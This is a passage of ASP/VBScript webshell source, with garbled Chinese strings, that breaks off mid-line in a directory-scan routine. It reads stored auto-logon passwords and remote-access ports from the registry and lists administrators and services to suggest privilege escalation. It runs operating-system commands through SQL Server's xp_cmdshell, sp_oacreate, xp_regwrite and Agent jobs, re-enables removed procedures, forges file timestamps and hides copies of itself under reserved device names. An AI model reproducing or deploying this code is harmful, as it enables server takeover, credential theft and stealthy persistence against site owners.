Function CopyFolder(Path)
Path=Split(Path,"||||")
If CF.FolderExists(Path(0)) and Path(1)<>"" Then
CF.CopyFolder Path(0),Path(1)
SI="<center><br><br><br>��ϲ��Ŀ¼"&Path(0)&"���Ƴɹ���</center>"
SI=SI&BackUrl
j SI
End If
End Function
Function MoveFolder(Path)
Path=Split(Path,"||||")
If CF.FolderExists(Path(0)) and Path(1)<>"" Then
CF.MoveFolder Path(0),Path(1)
SI="<center><br><br><br>��ϲ��Ŀ¼"&Path(0)&"�ƶ��ɹ���</center>"
SI=SI&BackUrl
j SI
End If
End Function
Function NewFolder(Path)
If Not CF.FolderExists(Path) and Path<>"" Then
CF.CreateFolder Path
SI="<center><br><br><br>��ϲ��Ŀ¼"&Path&"�½��ɹ���</center>"
SI=SI&BackUrl
j SI
End If
End Function
End Class
sub getTerminalInfo()
 on error resume next
dim wsh
set wsh=createobject("Wscript.Shell")
j"[����"&"̽��]<br><hr size=1>"
EnableTCPIPKey="HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters"
isEnable=Wsh.Regread(EnableTcpipKey)
If isEnable=0 or isEnable="" Then
Notcpipfilter=1
End If 
ApdKey="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind"
Apds=Wsh.RegRead(ApdKey)
If IsArray(Apds) Then 
For i=LBound(Apds) To UBound(Apds)-1
ApdB=Replace(Apds(i),"\Device\","")
j"����"&i&"������Ϊ:"&ApdB&"<br>"
Path="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\"
IPKey=Path&ApdB&"\IPAddress"
IPaddr=Wsh.Regread(IPKey)
If IPaddr(0)<>"" Then
For j=Lbound(IPAddr) to Ubound(IPAddr)
j"<li>IP��"&"ַ"&j&"Ϊ:"&IPAddr(j)&"<br>"
Next
Else
j"<li>IP��"&"ַ�޷���ȡ"&"��û������<br>"
End if
GateWayKey=Path&ApdB&"\DefaultGateway"
GateWay=Wsh.Regread(GateWayKey)
If isarray(GateWay) Then
For j=Lbound(Gateway) to Ubound(Gateway)
j"<li>����"&j&":"&Gateway(j)&"<br>"
Next
Else
j"<li>�����޷���ȡ��û������<br>"
End if
DNSKey=Path&ApdB&"\NameServer"
DNSstr=Wsh.RegRead(DNSKey)
If DNSstr<>"" Then
j"<li>����"&"DNSΪ:"&DNSstr&"<br>"
Else
j"<li>Ĭ��"&"DNS�޷���ȡ��û������<br>"
End If
if Notcpipfilter=1 Then 
j"<li>ûTcp/IPɸѡ<br>"
else
ETK="\TCPAllowedPorts"
EUK="\UDPAllowedPorts"
FullTCP=Path&ApdB&ETK
FullUDP=path&ApdB&EUK
tcpallow=Wsh.RegRead(FullTCP)
If tcpallow(0)="" or tcpallow(0)=0 Then
j"<li>����"&"��tcp�˿�Ϊ:ȫ��<br>"
Else
j"<li>����"&"��tcp�˿�Ϊ:"
For j = LBound(tcpallow) To UBound(tcpallow)
j tcpallow(j)&","
Next
j"<Br>"
End if
udpallow=Wsh.RegRead(FullUDP)
If udpallow(0)="" or udpallow(0)=0 Then
j"<li>����"&"��udp�˿�Ϊ:ȫ��<br>"
Else
j"<li>����"&"��udp�˿�Ϊ:"
for j = LBound(udpallow) To UBound(udpallow)
j UDPallow(j)&","
next
j"<br>"
End if
End if
j"------------------------------------------------<br>"
Next
end if
j"<br><br>[����"&"�˿�"&"̽��]<br><hr size=1>"
Telnetkey="HKEY_LOCAL_MACHINE\SOFTWARE\ Microsoft\TelnetServer\1.0\TelnetPort"
TlntPort=Wsh.RegRead(TelnetKey)
if TlntPort="" Then Tlnt="23(Ĭ��"&"����)"
j"<li>Telnet��"&"��:"&Tlntport&"<br>"
TermKey="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber"
TermPort=Wsh.RegRead(TermKey)
If TermPort="" Then TermPort="�޷�"&"��ȡ.��ȷ��"&"�Ƿ�ΪWindows Server�汾����"
j"<li>Terminal Service�˿�Ϊ:<font color=red>"&TermPort&"<br></font>"
If TermPort<>"" Then
end if
pcAnywhereKey="HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"
PAWPort=Wsh.RegRead(pcAnywhereKey)
If PAWPort="" then PAWPort="�޷�"&"��ȡ.��ȷ��"&"������"&"��װpcAnywhere"
j"<li>PcAnywhere�˿�Ϊ:"&PAWPort&"<br>"
j"------------------------------------------------------"
Set wsX = Server.CreateObject("WScript.Shell")
Dim terminalPortPath, terminalPortKey, termPort
Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword
terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
terminalPortKey = "PortNumber"
termPort = wsX.RegRead(terminalPortPath & terminalPortKey)
j"�ն�_����˿�"&"���Զ���¼<ol>"
If termPort = "" Or Err.Number <> 0 Then 
j"�޷��õ��ն˶˿�, ���Ȩ���Ƿ��ܵ�����.<br/>"
 Else
j"��ǰ�ն˷���"&"�˿�: " & termPort & "<br/>"
End If
autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
autoLoginEnableKey = "AutoAdminLogon"
autoLoginUserKey = "DefaultUserName"
autoLoginPassKey = "DefaultPassword"
isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)
If isAutoLoginEnable = 0 Then
Else
autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)
j"�Զ���¼"&"��ϵͳ�ʻ�: " & autoLoginUsername & "<br>"
autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)
If Err Then
Err.Clear
j"False"
End If
j"�Զ���¼"&"���ʻ�����: " & autoLoginPassword & "<br>"
End If
j"</ol>"
j"<br><br><br>[ϵͳ��_��̽��]<br><hr size=1>"
SoftPath=Wsh.Environment.item("Path")
Pathinfo=lcase(SoftPath)
j"ϵͳ��"&"��֧��:"
if Instr(Pathinfo,"perl") Then j"<li>Perl�ű�_:֧��<br>"
if instr(Pathinfo,"java") Then j"<li>Java�ű�_:֧��<br>"
if instr(Pathinfo,"microsoft sql server") Then j"<li>MSSQL���ݿ����_:֧��<br>"
if instr(Pathinfo,"mysql") Then j"<li>MySQL���ݿ����_:֧��<br>"
if instr(Pathinfo,"oracle") Then j"<li>Oracle���ݿ����_:֧��<br>"
if instr(Pathinfo,"cfusionmx7") Then j"<li>CFM������_:֧��<br>"
if instr(Pathinfo,"pcanywhere") Then j"<li>��������PcAnywhere����_:֧��<br>"
if instr(Pathinfo,"Kill") Then j"<li>Killɱ�����_:֧��<br>"
if instr(Pathinfo,"kav") Then j"<li> ��ɽϵ��ɱ�����_:֧��<br>"
if instr(Pathinfo,"antivirus") Then j"<li>��������ɱ�����_:֧��<br>"
if instr(Pathinfo,"rising") Then j"<li>����ϵ��ɱ�����_:֧��<br>"
paths=split(SoftPath,";")
j"------------------------------------<br>"
j"ϵͳ��ǰ_·������:<br>"
For i=Lbound(paths) to Ubound(paths)
j"<li>"&paths(i)&"<br>"
next
j"<br><br>[ϵͳ����_̽��]<br><hr size=1>"
pcnamekey="HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName"
pcname=wsh.RegRead(pcnamekey)
if pcname="" Then pcname="�޷���_ȡ������.<br>"
j"<li>��ǰ��_����Ϊ:"&pcname&"<br>"
AdminNameKey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AltDefaultUserName"
AdminName=wsh.RegRead(AdminNameKey)
if adminname="" Then AdminName="Administrator"
Response.Expires=0
on error resume next 
Set tN=server.createObject("Wscript.Network")
Set objGroup=GetObject("WinNT://"&tN.ComputerName&"/Administrators,group")
For Each admin in objGroup.Members
j "<li>����Ա�û���"&admin.Name&"<br></li>"
Next
if err then
j"�����̵Ĳ��а�:Wscript.Network"
end if
 
j"<li>Ĭ�Ϲ���"&"Ա�û���Ϊ:<font color=red>"&AdminName&"<br></font>"

isAutologin="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoAdminLogon"
Autologin=Wsh.RegRead(isAutologin)
if Autologin=0 or Autologin="" Then
j"<li>�û���_������:δ����<br>"
Else
j"<li>�û���_������:����<br>"
Admin=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultUserName")
Passwd=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword")
j"<li type=square>�û���:"&Admin&"<br>"
j"<li type=square><font color=red>����:"&Passwd&"<br></font>"
End if
displogin=wsh.regRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DontDisplayLastUserName")
If displogin="" or displogin=0 Then disply="��" else disply="��"
j"<li>�Ƿ���ʾ��_�ε����û�:"&disply&"<br>"
NTMLkey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0\NTML"
ntml=Wsh.RegRead(NTMLkey)
if ntml="" Then Ntml=1
j"<li>Telnet Ntml����Ϊ:"&ntml&"<br>"
hk="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count"
kk=wsh.RegRead(hk)
j"<li>��ǰ�_����Ϊ:"&kk&"<br>"
j"------------------------------------<br><br><br>"
j"[��������_��̽��]<br><hr>"
Set objComputer = GetObject("WinNT://.")
Set sa = Server.CreateObject("Shell.Application")
objComputer.Filter = Array("Service")
On Error Resume Next
For Each objService In objComputer
if objService.Name="Serv-U" Then
if objService.ServiceAccountName="LocalSystem" Then
j"<li>����������_Serv-U��װ,����LocalSystemȨ������,���Կ�����su.exe������Ȩ<br>"
End if
End if
if lcase(objService.Name)="apache" Then
if objService.ServiceAccountName="LocalSystem" Then
If instr(Request.ServerVariables("SERVER_SOFTWARE"),"Apache") Then
j"<li>��ǰWEB������ΪApache.����ֱ����Ȩ<br>"
Else
j" <li>����������_Apache�������,����Ȩ��ΪLocalSystem,���Կ���PHPľ��<br>"
End if
end if
End if
if instr(lcase(objService.Name),"tomcat") Then
if objService.ServiceAccountName="LocalSystem" Then
j"<li>����������_Tomcat,����LocalSystemȨ������,���Կ���ʹ��Jspľ����Ȩ<br>"
End if
End if
if instr(lcase(objService.Name),"winmail") Then
if objService.ServiceAccountName="LocalSystem" Then
j"<li>����������_Magic Winmail,����LocalSystemȨ������,���Բ���WebMailĿ¼,����д��PHPľ��<br>"
End if
End if
Next
Set fso=Server.Createobject("Scripting.FileSystemObject")
Sysdrive=left(Fso.GetspecialFolder(2),2)
servername=wsh.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName")
If fso.FileExists(sysdriver&"\Documents And Settings\All Users\Application Data\Symantec\"&servername&".cif") Then
j"<li>����_pcAnywhere�����ļ�,���Դ�Ĭ��Ŀ¼���ز��ƽ�õ�pcAnywhere����"
End if 

End Sub
sub promyself()
On Error Resume Next 
set f=fso.GetFile(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")))
if f.Attributes <> 39 then
f.Attributes=39
end if
set f=nothing
end sub
function sql()
if session("login")="" then
        j"<br><center><font color=red>û�е�½</font></center>"
	else
	j"<br><center><a href="&request.servervariables("url")&"?Action=sql&sqlaaa=logout><font color=red>�˳���½</font></a></center>"
end if
if session("login")="" then
	j"<table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
	j"<tr><td height='20' align='center'>SQL��Ȩ</td></tr>"
	j"<tr><td><Br><form name=form method=post sqlaaa="&request.servervariables("url")&">"
	j"<p>&nbsp;Sql�û�����"
	j"<input name=name type=text id=name value="&session("name")&">"
	j"&nbsp;Sql���룺"
	j"<input name=pass type=text id=pass value="&session("pass")&">"
	j"<p>&nbsp;Sql��������"
	j"<input name=port type=text id=server value=127.0.0.1>"
	j"&nbsp;Sql�˿ڣ�"
	j"<input name=port type=text id=port value=1433>"
	j"&nbsp;<input name=sqlaaa type=submit value=login>"
	j"</form></td></tr></table>"
else
	j"<table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
	j"<tr><td height='20' align='center' bgcolor='menu'>SQL��Ȩ</td></tr>"
	j"<tr><td><Br><form name=form method=post sqlaaa="&request.servervariables("url")&"><p>"
	j"&nbsp;�����⣺<input name=sqlaaa type=hidden value=test><input type=submit value=������></form>"
	j"<form name=form method=post sqlaaa="&request.servervariables("url")&"><p>"
	j"&nbsp;����ָ���<input name=sqlaaa type=hidden value=resume><input type=submit value=�ָ����></form>"
	j"<form name=form method=post sqlaaa="&request.servervariables("url")&"><p>"
	j"&nbsp;ϵͳ���<input name=cmd type=text>&nbsp;"
	j"<select name='tool' ><option value=''>ѡ�����г�������</option><option value=xp_cmdshell>xp_cmdshell</option><option value=sp_oacreate>sp_oacreate</option><option value=xp_regwrite>xp_regwrite</option><option value=sqlserveragent>sqlserveragent</option></option></select>"
	j"<input name=sqlaaa type=hidden value=cmd>&nbsp;&nbsp;"
	j"<input type=submit value=ִ��>"
	j"</form>"
	j"<form name=form1 method=post sqlaaa="&request.servervariables("url")&">"
	j"<p>&nbsp;ִ����䣺"
	j"<input name=sql type=text>"
	j"<input name=sqlaaa type=hidden value=sql>&nbsp;&nbsp;"
	j"<input type=submit value=ִ��>"	
	j"</form></td></tr></table><br>"

end if
if request("sqlaaa")="login" then
    set adoconn=server.createobject("adodb.connection") 
     adoconn.open "provider=sqloledb.1;data source=" & request.form("server") & "," & request.form("port") & ";password=" & request.form("pass") & ";uid=" & request.form("name")
    if err.number=-2147467259 then 
    j"<font color=red>����Դ���Ӵ������飡</font>"
    response.end
elseif err.number=-2147217843 then
    j"<font color=red>�û����������������飡</font>"
    response.end
elseif err.number=0 then
    strquery="select @@version"
		set recresult = adoconn.execute(strquery)
		j"<table align='center' width='600'><hr><br><font color=red>"
if instr(recresult(0),"NT 5.0") then
		j"Windows 2000ϵͳ"
    session("system")="2000"
    elseif instr(recresult(0),"NT 5.1")  then
    j"Windows xpϵͳ"
    session("system")="xp"
    elseif instr(recresult(0),"NT 5.2")  then
    j"Windows 2003ϵͳ"
    session("system")="2003"
    else
    j"��������ϵͳ"
    session("system")="no"
    end if
    strquery="select is_srvrolemember('sysadmin')"
       set recresult = adoconn.execute(strquery)
    if recresult(0)=1 then
    j"<br>��ϲ��SQL Server���Ȩ��</font><br><hr></table>"
    session("pri")=1
    else
    j"<br>���ƣ�Ȩ�޲������Ʋ���ִ�����</font><br><hr></table>"
    session("pri")=0
    end if
		session("login")="yes"
		session("name")=request.form("name")
		session("pass")=request.form("pass")
		session("server")=request.form("server")
		session("port")=request.form("port")
		j"<meta http-equiv='refresh' content='1;URL=?Action=sql'>"
End if

Elseif request("sqlaaa")="test"  then
    if session("login")<>"" then
    j"<table align='center' width='600'><hr><br><font color=red>"
    if session("system")="2000" then
    j"Windows 2000ϵͳ"
    elseif session("system")="xp" then
    j"Windows xpϵͳ"
    elseif session("system")="2003" then
    j"Windows 2003ϵͳ"
    else
    j"��������ϵͳ"
    end if
    if session("pri")=1 then
    j"<br>��ϲ��SQL Server���Ȩ��</font><br>"
    else 
    j"<br>���ƣ�Ȩ�޲������Ʋ���ִ�����</font><br>"
end if
    set adoconn=server.createobject("adodb.connection") 
     adoconn.open "provider=sqloledb.1;data source=" & session("server") & "," & session("port") & ";password=" & session("pass") & ";uid=" & session("name")        

    strquery="select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'"
    set recresult = adoconn.execute(strquery)
    j"<font color=red>"
    if recresult(0) then
    session("xp_cmdshell")=1 
    j"xp_cmdshell............. ����!"
    else
    session("xp_cmdshell")=0 
    j"xp_cmdshell............. ������!"
    end if
    strquery="select count(*) from master.dbo.sysobjects where xtype='x' and name='sp_oacreate'"
    set recresult = adoconn.execute(strquery) 
    if recresult(0) then 
    j"<br>sp_oacreate............. ����!"
    session("sp_oacreate")=1
    else 
    j"<br>sp_oacreate............. ������!"
    session("sp_oacreate")=0
    end if
    strquery="select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_regwrite'"
    set recresult = adoconn.execute(strquery) 
    if recresult(0) then 
    j"<br>xp_regwrite............. ����!"
    session("xp_regwrite")=1
    else 
    j"<br>xp_regwrite............. ������!"
    session("xp_regwrite")=0
    end if
    strquery="select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_servicecontrol'"
    set recresult = adoconn.execute(strquery) 
    if recresult(0) then 
    j"<br>xp_servicecontrol....... ����!</font><hr></table>"
    session("xp_servicecontrol")=1
    else 
    j"<br>xp_servicecontrol....... ������!</font><hr></table>"
    session("xp_servicecontrol")=0
    end if
    else 
    j"<script>alert('������ʱ�����µ�½��')</script>"
    j"<center><a href="&request.servervariables("url")&"?Action=sql&sqlaaa=logout><font color=black>��½��ʱ</font>"
    response.end
    end if 

elseif request("sqlaaa")="cmd" then
    if session("login")<>"" then
    if session("pri")=1 then
    if request("tool")="xp_cmdshell" then
    set adoconn=server.createobject("adodb.connection") 
     adoconn.open "provider=sqloledb.1;data source=" & session("server") & "," & session("port") & ";password=" & session("pass") & ";uid=" & session("name")
    if request.form("cmd")<>"" then 
      strquery = "exec master.dbo.xp_cmdshell '" & request.form("cmd") & "'" 
    set recresult = adoconn.execute(strquery) 
    if not recresult.eof then 
    do while not recresult.eof 
    strresult = strresult & chr(13) & recresult(0) 
    recresult.movenext 
    loop
    end if
    set recresult = nothing
    j"<table align='center' width='600'><hr>����"&request("tool")&"��չִ��&nbsp;&nbsp;C:\windows\system32>"&request.form("cmd")&"<br>"
    j"<textarea style='width:600;height:250'>"
    j strresult
    j"</textarea><hr></table>"
end if 

elseif request("tool")="sp_oacreate" then 
    set adoconn=server.createobject("adodb.connection") 
     adoconn.open "provider=sqloledb.1;data source=" & session("server") & "," & session("port") & ";password=" & session("pass") & ";uid=" & session("name")
if request.form("cmd")<>"" then 
      strquery = "create table [jnc](resulttxt nvarchar(1024) null);use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamethod @o,'run',null,'cmd /c "&request("cmd")&" > 8617.tmp',0,true;bulk insert [jnc] from '8617.tmp' with (keepnulls);"
    adoconn.execute(strquery)
    strquery = "select * from jnc"
    set recresult = adoconn.execute(strquery)
if not recresult.eof then 
  do while not recresult.eof 
    strresult = strresult & chr(13) & recresult(0) 
    recresult.movenext 
    loop 
end if
    set recresult = nothing
    j"<table align='center' width='600'><hr>����"&request("tool")&"��չִ��&nbsp;&nbsp;C:\windows\system32>"&request.form("cmd")&"<br>"
    j"<textarea style='width:600;height:250'>"
    j strresult
    j"</textarea><hr></table>"
    strquery = "drop table [jnc];declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamethod @o,'run',null,'cmd /c del 8617.tmp'"
    adoconn.execute(strquery)
end if

elseif request("tool")="xp_regwrite" then
    if session("system")="2000" then
    path="c:\winnt\system32\ias\ias.mdb"
    else
    path="c:\windows\system32\ias\ias.mdb"
    end if
    set adoconn=server.createobject("adodb.connection") 
     adoconn.open "provider=sqloledb.1;data source=" & session("server") & "," & session("port") & ";password=" & session("pass") & ";uid=" & session("name")
    if request.form("cmd")<>"" then
    cmd=chr(34)&"cmd.exe /c "&request.form("cmd")&" > 8617.tmp"&chr(34)
    strquery = "create table [jnc](resulttxt nvarchar(1024) null);exec master..xp_regwrite 'hkey_local_machine','software\microsoft\jet\4.0\engines','sandboxmode','reg_dword',0;select * from openrowset('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&cmd&")');"
    adoconn.execute(strquery)
    strquery = "select * from openrowset('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c copy 8617.tmp jnc.tmp"&chr(34)&")');bulk insert [jnc] from 'jnc.tmp' with (keepnulls);"
    set recresult = adoconn.execute(strquery)
    strquery="select * from [jnc];"
    set recresult = adoconn.execute(strquery)
    if not recresult.eof then 
    do while not recresult.eof 
    strresult = strresult & chr(13) & recresult(0) 
    recresult.movenext 
    loop 
    end if
    set recresult = nothing
    j"<table align='center' width='600'><hr>����"&request("tool")&"��չִ��&nbsp;&nbsp;C:\windows\system32>"&request.form("cmd")&"<br>"
    j"<textarea style='width:600;height:250'>"
    j strresult
    j"</textarea><hr></table>"
    strquery = "drop table [jnc];exec master..xp_regwrite 'hkey_local_machine','software\microsoft\jet\4.0\engines','sandboxmode','reg_dword',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c del 8617.tmp&&del jnc.tmp"&chr(34)&")');"
    adoconn.execute(strquery)
end if

elseif request("tool")="sqlserveragent" then
    set adoconn=server.createobject("adodb.connection") 
     adoconn.open "provider=sqloledb.1;data source=" & session("server") & "," & session("port") & ";password=" & session("pass") & ";uid=" & session("name")

if request.form("cmd")<>"" then
    if session("sqlserveragent")=0 then
    strquery = "exec master.dbo.xp_servicecontrol 'start','sqlserveragent';"
    adoconn.execute(strquery)
    session("sqlserveragent")=1
end if

    strquery = "use msdb create table [jncsql](resulttxt nvarchar(1024) null) exec sp_delete_job null,'x' exec sp_add_job 'x' exec sp_add_jobstep null,'x',null,'1','cmdexec','cmd /c "&request.form("cmd")&"' exec sp_add_jobserver null,'x',@@servername exec sp_start_job 'x';"
    adoconn.execute(strquery)
    adoconn.execute(strquery)
    adoconn.execute(strquery)

    j"<table align='center' width='600'><hr>����"&request("tool")&"��չִ��&nbsp;&nbsp;C:\windows\system32>"&request.form("cmd")&"<br>"
    j"<textarea style='width:600;height:250'>"
    j vbcrf
    j"����չ�޻��ԣ�����ͨ���ض���鿴������"
    j"</textarea><hr></table>"
    strquery = "use msdb drop table [jncsql];"
    adoconn.execute(strquery)
    end if
    elseif request("tool")="" then 
    j"<script>alert('ѡ����Ҫʹ�õ���չ')</script>"
    end if
    else
    j"<script>alert('Ȩ�޲���Ŷ��')</script>"
    end if
    else 
    j"<script>alert('������ʱ�����µ�½��')</script>"
    j"<center><a href="&request.servervariables("url")&"?Action=sql&sqlaaa=logout><font color=black>��½��ʱ</font>"
    response.end
    end if

elseif request("sqlaaa")="resume" then
    if session("login")<>"" then
    set adoconn=server.createobject("adodb.connection") 
    adoconn.open "provider=sqloledb.1;data source=" & session("server") & "," & session("port") & ";password=" & session("pass") & ";uid=" & session("name")
    if session("xp_cmdshell")=0 then
    strquery="dbcc addextendedproc ('xp_cmdshell','xplog70.dll')"
    adoconn.execute(strquery)	
    j"<table align='center' width='600'><hr><font color=red>�Ѿ����Իָ�xp_cmdshell</font><hr></table>"
    elseif session("sp_oacreate")=0 then
    strquery="dbcc addextendedproc ('sp_oacreate','odsole70.dll')"
    adoconn.execute(strquery)	
    j"<table align='center' width='600'><hr><font color=red>�Ѿ����Իָ�sp_oacreate</font><hr></table>"
    elseif session("xp_regwrite")=0 then
    strquery="dbcc addextendedproc ('xp_regwrite','xpstar.dll')"
    adoconn.execute(strquery)	
    j"<table align='center' width='600'><hr><font color=red>�Ѿ����Իָ�xp_regwrite</font><hr></table>"
    elseif session("xp_servicecontrol")=0 then
    strquery="dbcc addextendedproc ('xp_servicecontrol','xprepl.dll')"
    adoconn.execute(strquery)	
    j"<table align='center' width='600'><hr><font color=red>�Ѿ����Իָ�xp_servicecontrol</font><hr></table>"	
    else j"<table align='center' width='600'><hr><font color=red>��ϲ�������ȫ</font><hr>"	
    end if
    else 
    j"<script>alert('������ʱ�����µ�½��')</script>"
    j"<center><a href="&request.servervariables("url")&"?Action=sql&sqlaaa=logout><font color=black>��½��ʱ</font>"
    response.end
end if
elseif request("sqlaaa")="sql" then
    if session("login")<>"" then
    if request.form("sql")<>"" then
    set adoconn=server.createobject("adodb.connection") 
     adoconn.open "provider=sqloledb.1;data source=" & session("server") & "," & session("port") & ";password=" & session("pass") & ";uid=" & session("name")
    strquery=request.form("sql")
    set recresult = adoconn.execute(strquery) 
    if not recresult.eof then 
    do while not recresult.eof 
    strresult = strresult & chr(13) & recresult(0) 
    recresult.movenext 
    loop
    end if
    set recresult = nothing
    j"<table align='center' width='600'><hr><textarea style='width:600;height:250'>"
    j"ִ��sql���:"
    j request.form("sql") 
    j strresult
    j"</textarea><hr></table>"
    end if
    else 
    j"<script>alert('������ʱ�����µ�½��')</script>"
    j"<center><a href="&request.servervariables("url")&"?Action=sql&sqlaaa=logout><font color=black>��½��ʱ</font>"
    response.end
    end if
end if

if request("sqlaaa")="logout" then
    set adoconn=nothing
    session("login")=""
    session("name")=""
    session("pass")=""
    session("server")=""
    session("port")=""
    session("system")=""
    session("pri")="" 
    j"<meta http-equiv='refresh' content='1;URL=?Action=sql'>"
end if
end function
Sub Message(state,msg,flag):j"<TABLE width=60% border=0 align=center cellpadding=0 cellspacing=1 bgcolor=#ddd> <TR></TR><TR><TD align=middle bgcolor=#ecfccd><TABLE width=82% border=0 cellpadding=5 cellspacing=0><TR><TD><FONT color=red>"
j state
j"</FONT></TD><TR><TD><P>"&msg
j"</P></TD></TR></TABLE></TD></TR><TR><TD class=TBEnd>"
If flag=0 Then
j" <INPUT type=button value=�ر� onclick='window.close();'>"
Else
End if
j"</TD></TR></TABLE>"
End Sub
Function Red(str)
Red = "<FONT color=#ff2222>" & str & "</FONT>"
End Function

function datess
response.write "<form method=post>" 
response.write "· ����<input name=path value='"&server.mappath("/")&"\' size='30'>(һ��Ҫ��\��β)<br />" 
response.write "�ļ����ƣ�<input name=filename value='test.txt' size='30'><br />" 
response.write "�޸����ԣ�<input name=attri value='1+2+4' size='30'>(1Ϊֻ��2Ϊ����4Ϊϵͳ)<br />" 
response.write "�޸�ʱ�䣺<input name=time value='12/30/2010 12:30:30' size='30'><br />" 
response.write "<input type=submit value=�޸Ĳ������ļ�>" 
response.write "</form>" 

'��ȡ�ύ�Ĳ��� 
set path=request.Form("path") 
set fileName=request.Form("filename") 
set newTime=request.Form("time") 
set attri=request.Form("attri") 
if( (len(path)>0)and(len(fileName)>0)and(len(newTime)>0) )then 

'ͨ��fso�����ļ����� 
Set fso=Server.CreateObject("Scripting.FileSystemObject") 
Set file=fso.getFile(path&fileName) 
file.attributes=attri '�����ļ�����Ϊ����+ϵͳ 

'ͨ��shell.Application�޸��ļ�������޸�ʱ�� 
Set shell=Server.CreateObject("Shell.Application") 
Set app_path=shell.NameSpace(server.mappath(".")) 
Set app_file=app_path.ParseName(fileName) 
app_file.Modifydate=newTime 
end if
end function
sub hiddenshell
fpath=request.servervariables("path_translated")
set fso=server.createobject("scripting.filesystemobject")
pex="com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9"
rndpex=split(pex,"|")(rndnumber(0,17))
session("seljw")=""
filepath1=server.mappath(".")
filename1=right(fpath,len(fpath)-instrrev(fpath,"\"))
url2=request.servervariables("url")
url2=left(url2,instrrev(url2,"/"))&rndpex&"."&filename1
fso.copyfile fpath,"\\.\"&filepath1&"\"&rndpex&"."&filename1
Set namesf=fso.GetFile("\\.\"&filepath1&"\"&rndpex&"."&filename1)
namesf.attributes = 39
set fso=nothing
set namesf=nothing
j "<br><br><br><br><br><br><center>������ʬ������......</center>"
j "<script>window.location='http://"&request("server_name")&url2&"';</script>"
end sub
Function RndNumber(Min,Max) 
Randomize 
RndNumber=Int((Max - Min + 1) * Rnd() + Min) 
End Function 
Sub ScanDriveForm():On Error Resume Next:Dim FSO,DriveB
Set FSO = Server.Createobject("Scripting.FileSystemObject")
path_arr = vbcrlf&"c:\php\"&vbcrlf&"d:\Program Files\"&vbcrlf&"C:\Documents and Settings\All Users\Documents\"&vbcrlf&"C:\recycler\"&vbcrlf&"d:\recycler\"&vbcrlf&"e:\recycler\"&vbcrlf&"f:\recycler\"&vbcrlf&"c:\recycled\"&vbcrlf&"C:\wmpub\"&vbcrlf&"C:\360rec\"&vbcrlf&"C:\cache\"&vbcrlf&"C:\JPEGCapture\"&vbcrlf&"C:\Inetpub\"&vbcrlf&"c:\TDDOWNLOAD\"&vbcrlf&"d:\TDDOWNLOAD\"&vbcrlf&"e:\TDDOWNLOAD\"&vbcrlf&"e:\wwwroot\"&vbcrlf&"d:\wwwroot\"&vbcrlf&"C:\Program Files\"&vbcrlf&"c:\docume~1\alluse~1\Application Data\Symantec\pcAnywhere"&vbcrlf&"C:\Documents and Settings\All Users\����\"&vbcrlf&"c:\mysql\"&vbcrlf&"C:\windows\system32\spool\PRINTERS\"&vbcrlf&"C:\WINDOWS\IIS Temporary Compressed Files\"&vbcrlf&"C:\WINDOWS\Microsoft.NET\Framework\v1.1.4322\Temporary ASP.NET Files"&vbcrlf&"C:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\Temporary ASP.NET Files"&vbcrlf&"C:\Documents and Settings\NetworkService\Local Settings\Temp"&vbcrlf&"C:\Documents and Settings\NetworkService\Local Settings\Temporary Internet Files"&vbcrlf&"C:\Windwos\system32\inetsrv\data\"&vbcrlf&"C:\Documents and Settings\All Users\Application Data\Microsoft\Media Index\"&vbcrlf&"C:\php\PEAR\"&vbcrlf&"C:\Program Files\Zend\ZendOptimizer-3.3.0\"&vbcrlf&"C:\Program Files\Common Files\"&vbcrlf&"C:\7i24.com\iissafe\log\"&vbcrlf&"C:\WINDOWS\7i24.com\FreeHost"&vbcrlf&"C:\RECYCLER"&vbcrlf&"C:\windows\temp\"&vbcrlf&"c:\Program Files\Microsoft SQL Server\90\Shared\ErrorDumps\"&vbcrlf&"C:\Program Files\Symantec 